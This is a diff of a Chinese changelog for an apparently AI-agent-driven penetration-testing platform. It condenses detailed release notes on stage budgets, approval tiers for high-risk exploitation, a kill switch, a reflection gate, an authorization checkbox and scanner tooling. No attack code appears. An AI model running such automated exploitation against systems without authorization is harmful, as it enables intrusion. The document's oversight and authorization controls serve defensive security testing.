-- 修复：S4 收口催收单次提醒不足以压制开拓冲动（实测仍 2 次预算耗尽）——升级为双段预算预警：剩 8 轮开始收口流程、剩 3 轮禁止新测试强制 complete_stage
+- 修复（双段预算预警）
 
 ## v2.2.1 · 2026-11-04
 
-- 修复：S4 在富漏洞目标上连续 4 次迭代预算耗尽无法收口（开放探索不收敛）——新增「预算感知收口提醒」：剩余 3 轮时引擎主动注入催收指令（确证结论入库→产出交付物→complete_stage，未完成项写「待续清单」移交）
+- 修复（预算感知收口提醒）
 
 ## v2.2 · 2026-11-04
 
-- 修复：一键熔断后项目状态仍显示「运行中」——被取消的流水线协程用旧快照回写覆盖了 killed 状态（实测复现）；熔断现同步作用于运行中活指针，最终状态必为 killed
-- 修复：complete_stage 交付物清单出现重复条目（fresh 实体文件与模型自报清单重复 append）——去重合并
-- 修复：项目列表为空时 /api/projects 返回 null——统一返回 []
-- 改进：阶段迭代预算 40 → 60（实测富漏洞目标 S4 需更多轮次收口，40 连续 4 次预算耗尽）
-- 改进：执行循环宪法新增「续跑/重跑纪律」——重跑先承接 evidence/ 与 deliverables/ 已有产出，已确证结论立即入库不再复测（实测 S4 重跑从基线重来浪费预算）
-- 改进：上下文包列出覆盖矩阵关键明细（vulnerable/needs_follow_up 行）+ search_memory 可检索覆盖账本
+- 修复（熔断状态覆盖）
+- 修复（交付物清单去重）
+- 修复（空项目列表返回 []）
+- 改进（阶段预算 40→60）
+- 改进（续跑/重跑纪律）
+- 改进（上下文包覆盖明细）
 
 ## v2.1 · 2026-11-04
 
-- 修复：左上角版本号与实际不符——版本收敛到单一事实源 internal/version（现 v2.1.0）；顶栏 chip 在登录路径兜底加载；/api/public/info 改报实际默认模型（DeepSeek）
-- 修复：对话工作台用户输入智能体不执行——LLM 失败时用户消息先落执行流并落一条助手错误回复（此前仅 toast 一闪而过，消息凭空消失）；指令注入遇待审批阻塞时明确提示生效时机；发送后 600ms/2.8s 双时刻补拉
-- 修复：回环（loopback）死代码——rerun 队列从未登记导致回环从不重跑；现在 loopback 登记补跑队列（单项目上限 3 次）由流水线真正执行
-- 修复：阶段失败流水线照跑且项目无条件标 done——现在阶段失败（LLM 断连/迭代耗尽）立即停止流水线并如实标 failed，可在阶段流水线手动重跑续测
-- 修复：登录验证码可被脚本从 SVG <text> 明文解析（实测 10 行脚本自动破译）——改为描边路径字体渲染，标记中不再含明文字符
-- 修复：执行流实时日志显示 Invalid Date（WS 与回填时间戳格式不一致）
-- 修复：执行流 Markdown 表格不渲染——md2html 支持 GFM 表格（端口表/漏洞清单可读性）
-- 修复：创建项目页 authorized 前端硬编码 true——新增显式「授权确认」必勾项，未勾选禁止创建
-- 修复：favicon 404——内置站点图标
-- 修复：报告页在未生成时请求 /report 返回 404 噪音——改为 200+exists:false，并修复路径遍历分支 writeErr(nil) 隐患；报告页随项目切换刷新
-- 修复：运行中把审批策略切到「全部自动批准」时，存量待批工单仍按旧策略无限阻塞执行循环（实测 S4 卡死 30 分钟）——策略切换联动放行存量待批工单并留痕
-- 改进：上下文包声明已注入的空间测绘 Key 能力（$QUAKE_KEY 等）+ 侦察剧本补充 Quake 用法——修复智能体曾误报「无测绘 Key 已跳过」，实测 S1 已主动用 Quake 交叉验证端口
-- 修复：运行中修改审批策略被流水线旧项目快照回写覆盖（实测改 all 后库中仍是 l1，后续 L2 工单继续按 manual 挂起）——活指针注册，策略变更同步作用于运行中对象
-- 改进：docker-compose 增加 init:true（tini 回收孤儿进程，扫描器子进程被超时击杀后曾以僵尸态累积）
+- 修复（版本单一事实源）
+- 修复（对话输入不执行）
+- 修复（回环死代码）
+- 修复（阶段失败流水线停止）
+- 修复（验证码描边渲染）
+- 修复（时间戳格式）
+- 修复（GFM 表格渲染）
+- 修复（授权确认必勾）
+- 修复（favicon 404）
+- 修复（报告 404 噪音）
+- 修复（策略切换存量工单放行）
+- 改进（测绘 Key 能力声明）
+- 修复（策略变更活指针）
+- 改进（tini 回收孤儿进程）
 
 ## v2.0 · 2026-11-03
 
-- 前端重构：Vue 3 + Vite 多面板实时工作台（三栏：阶段导航 / 统一执行流消息面板 / 审批·提问·子任务·工具·覆盖度·交付物标签页）
-- 统一时间线：对话轮、指挥室指令、阶段消息、工具调用、引擎日志合并为单一持久化消息流，刷新/断线重连自动回填
-- WebSocket 断线指数退避重连 + 8s 轮询兜底；旧版界面保留为 /legacy.html 兜底入口
+- 重构（前端）：Vue 3 + Vite 多面板实时工作台
+- 新增（统一时间线）：全量持久化消息流
+- 新增（WebSocket 重连与 legacy 兜底）
 
 ## v1.8 · 2026-11-03
 
-- PentAGI 优点移植：子任务计划与进度跟踪、六专家会诊、收口反思门（BLOCK 拦截并可修复重提）、执行监控防死循环、向人提问屏障
-- 运行中项目可在对话工作区直接下达指令（注入执行流，下一轮生效）
-- 修复：反思门拦截后阶段仍被标记完成、交付物清单丢失
-- 修复：未启用专项 A 时仍做 AI 资产识别（现在明确跳过）
-- 「发现」改名「漏洞」；收紧收录纪律——仅收录有证据支撑、有实际影响的漏洞
-- 默认审批策略调整为「仅 L2 高危利用/漏洞验证人工批准」，L0/L1 自动执行并全量留痕
+- 新增（PentAGI 移植）：子任务/会诊/反思门/执行监控/提问屏障
+- 新增（对话直接指令）
+- 修复（反思门拦截后状态标记）
+- 修复（未启用专项跳过）
+- 变更（「发现」改名「漏洞」；收录纪律收紧）
+- 变更（审批策略默认仅 L2 人工）
 
 ## v1.7 · 2026-11-03
 
-- 审批策略三档（全部人工/仅L1自动/全部自动），自动与人工批准均落库留痕（mode/决策方/时间），L0 只读也生成留痕工单
-- 执行流持久化：对话消息/工具调用/引擎日志全量落库，Web 刷新后自动回填（修复刷新丢数据）
-- 修复：选中项目发对话消息必崩溃（heads[chat] 空指针）
-- 修复：重启后所有模型 base_url 为空导致 LLM 全挂（恢复结构体缺 json tag，测绘 Key 同受影响）
-- nmap 扫描纪律优化：两段式（top-1000 摸底 + 全端口 -p- 必做）+ 高位端口漏报复核（实测高速率会漏报开放端口）
+- 新增（审批策略三档与全量留痕）
+- 新增（执行流持久化）
+- 修复（对话崩溃空指针）
+- 修复（重启后模型恢复）
+- 改进（nmap 两段式扫描纪律）
 
 ## v1.6 · 2026-11-03
 
-- 多模型配置（火山方舟/OpenAI/Claude/DeepSeek/Ollama 预设），创建项目时选择使用哪个模型
-- 仪表盘估算成本：设置页填入单价（$/1M tokens），输入/输出分开计算
-- 「证据链」合并进「漏洞」页：每条漏洞可展开查看复现命令与产出
+- 新增（多模型配置与项目级选择）
+- 新增（仪表盘成本估算）
+- 改进（证据链并入漏洞页）
 
 ## v1.5 · 2026-11-03
 
-- 新增「设置」页：AI 模型（OpenAI/Anthropic 双协议）与空间测绘 Key 界面直配，Key 加密存储不回显
-- 对话工作区对齐 PentAGI：阶段任务/交付物页签；任务运行中与结束后均可连续提问，会话持久化
-- 全站状态中文化；新增更新记录页
+- 新增（设置页）：模型与测绘 Key 直配，加密存储
+- 新增（对话工作区页签与持久化）
+- 改进（状态中文化与更新记录页）
 
 ## v1.0-v1.4 · 2026-11-03
 
-- 九头鸟出生：九头流水线 + 审批矩阵 + 一键熔断 + 全量证据链
-- Docker 化 + 内置工具链（nmap/nuclei/httpx/ffuf/subfinder）；专项 A/B1/B2
-- 接入真实大模型；账号密码+验证码登录；技能库 15 剧本；强制实体交付物
+- 新增（九头鸟初版）：九头流水线+审批矩阵+一键熔断+全量证据链
+- 新增（Docker 化与内置工具链；三个专项）
+- 新增（真实模型接入、登录、技能库 15 剧本、强制实体交付物）
 
